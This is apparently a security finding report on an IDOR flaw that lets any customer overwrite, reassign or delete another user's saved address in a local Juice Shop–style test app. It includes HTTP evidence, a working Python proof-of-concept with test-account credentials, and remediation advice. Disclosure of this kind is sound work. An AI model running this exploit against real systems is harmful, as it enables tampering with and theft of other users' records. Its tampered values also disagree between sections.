# IDOR: Any authenticated user can modify or delete another user's saved address (PUT/DELETE /api/Addresss/:id)

**ID:** vuln-0006
**Severity:** HIGH
**Found:** 2026-09-11 19:56:56 UTC
**Target:** http://host.docker.internal:3001
**Endpoint:** /api/Addresss/:id
**Method:** PUT
**CWE:** CWE-639
**CVSS:** 7.1
**Confidence:** High
**Fix Effort:** Low

## Description

The update and delete handlers for saved delivery addresses (`PUT/DELETE /api/Addresss/:id`) perform no ownership check. Any authenticated customer can overwrite another user's saved address — and the update silently reassigns the record to the attacker — or delete it outright. Only the read path is protected.

## Evidence

Victim B (id 27) owns address id 8. Attacker A (id 25):

```json
PUT /api/Addresss/8
Authorization: Bearer <A's customer JWT>
{"fullName": "Attacker Controlled", "city": "HACKED", "zipCode": "00000", "country": "Switzerland", "UserId": 27}

200 OK
{"status":"success","data":{"UserId":25,"id":8,"fullName":"Attacker Controlled","city":"HACKED","zipCode":"00000",...}}
```

Note `UserId` changed from 27 to 25 — record stolen from B. Deletion:

```json
DELETE /api/Addresss/8   (as A)
200 OK  {"status":"success","data":"Address deleted successfully."}
```

Earlier round: `PUT /api/Addresss/7` (B's first address) as A → 200, fields tampered; `DELETE /api/Addresss/7` as A → 200. B's `GET /api/Addresss` afterwards returned `[]`. Controls: `GET /api/Addresss/7` as A → 400 "Malicious activity detected"; `GET /api/Addresss` as A → only A's (empty) list; unauth PUT → 401.

## Impact

Any customer can tamper with or destroy other users' saved delivery addresses. Because checkout consumes the saved address, a tampered address redirects the victim's future orders to an attacker-chosen location — a concrete path to intercepting deliveries. The reassignment side effect also steals the record outright from the victim.

## Counterevidence

Checked the read path: per-object GET /api/Addresss/7 is correctly blocked with 400 "Malicious activity detected", and GET /api/Addresss returns only the caller's records — so a read-specific control exists. Checked list endpoints for a compensating view: no cross-user read was possible. However, that read control demonstrably does not cover the update/delete handlers, which returned 200 for a foreign record. Checked whether the PUT failed silently: the response echoed the tampered fields ("Hacked By A", city "PWN") and UserId changed to 25, and B's subsequent list lost the record after DELETE — mutations were applied for real.

## What Would Change This Severity

Confirmation that checkout uses the tampered saved address for the victim's subsequent orders would demonstrate delivered-goods interception and raise availability/integrity impact further; conversely, if updates were restricted to the caller's records the issue would be eliminated.

## Technical Analysis

The Address model has an ownership guard on `find` (per-object GET returns "Malicious activity detected" for foreign records and the list endpoint returns only the caller's rows), but the `update` and `destroy` handlers accept a bare record ID. The PUT handler additionally persists a client-supplied `UserId`, so the attacker both corrupts the record and takes ownership of it — a mass-assignment-style reassignment combined with missing authorization. The DELETE handler destroys any record by ID. Address IDs are small sequential integers, enumerable by any customer.

## Proof of Concept

1. Register attacker A and victim B; log in both and obtain JWTs. 2. As B, create a saved address via `POST /api/Addresss` and note its ID (visible in B's `GET /api/Addresss` list). 3. As A, send `PUT /api/Addresss/<that id>` with modified fields. 4. Observe 200 with the tampered values and `UserId` now equal to A's ID. 5. As A, send `DELETE /api/Addresss/<id>`; observe 200 and B's address list now empty. 6. Confirm the read control exists: `GET /api/Addresss/<id>` as A returns 400 "Malicious activity detected".

```python
import requests

BASE = "http://host.docker.internal:3001"
a = requests.post(BASE + "/rest/user/login", json={"email": "tester.recon@juice-sh.op", "password": "recon123456"}).json()["authentication"]["token"]
b = requests.post(BASE + "/rest/user/login", json={"email": "idor.b.jcgpw4pc@juice-sh.op", "password": "IdorTest123!"}).json()["authentication"]["token"]
H_A = {"Authorization": "Bearer " + a}
H_B = {"Authorization": "Bearer " + b}

addr = requests.post(BASE + "/api/Addresss", headers=H_B,
                     json={"fullName": "Idor Target", "zipCode": "13375", "city": "Secretville", "country": "Switzerland"}).json()["data"]
aid = addr["id"]

# Attacker overwrites the victim's address
r = requests.put(f"{BASE}/api/Addresss/{aid}", headers=H_A,
                 json={"fullName": "Attacker Controlled", "city": "HACKED", "zipCode": "00000", "country": "Switzerland"})
print("PUT:", r.status_code, "UserId now:", r.json()["data"]["UserId"], "city:", r.json()["data"]["city"])
# -> 200 UserId now: 25 city: HACKED   (record reassigned to attacker)

# Attacker deletes the victim's address
print("DELETE:", requests.delete(f"{BASE}/api/Addresss/{aid}", headers=H_A).status_code)  # -> 200
print("victim addresses:", requests.get(BASE + "/api/Addresss", headers=H_B).json()["data"])  # -> []
# read control still present:
print("GET as attacker:", requests.get(f"{BASE}/api/Addresss/{aid}", headers=H_A).status_code)  # -> 400
```

## Remediation

In the update and delete handlers for the Address model, resolve the record with a query filtered on both the requested ID and the authenticated user's ID (from the JWT), returning 403 or 404 on mismatch — mirroring the check already implemented on the read path. Additionally, ignore or validate any client-supplied `UserId` on update so a foreign record cannot be reassigned to the caller, and never let an update change record ownership implicitly.

## Assumptions

Assumes the attacker holds any valid customer JWT (obtainable via free self-registration) and knows or guesses a victim address record ID; IDs are small sequential integers. Demo data; a production deployment would expose genuine customer PII.
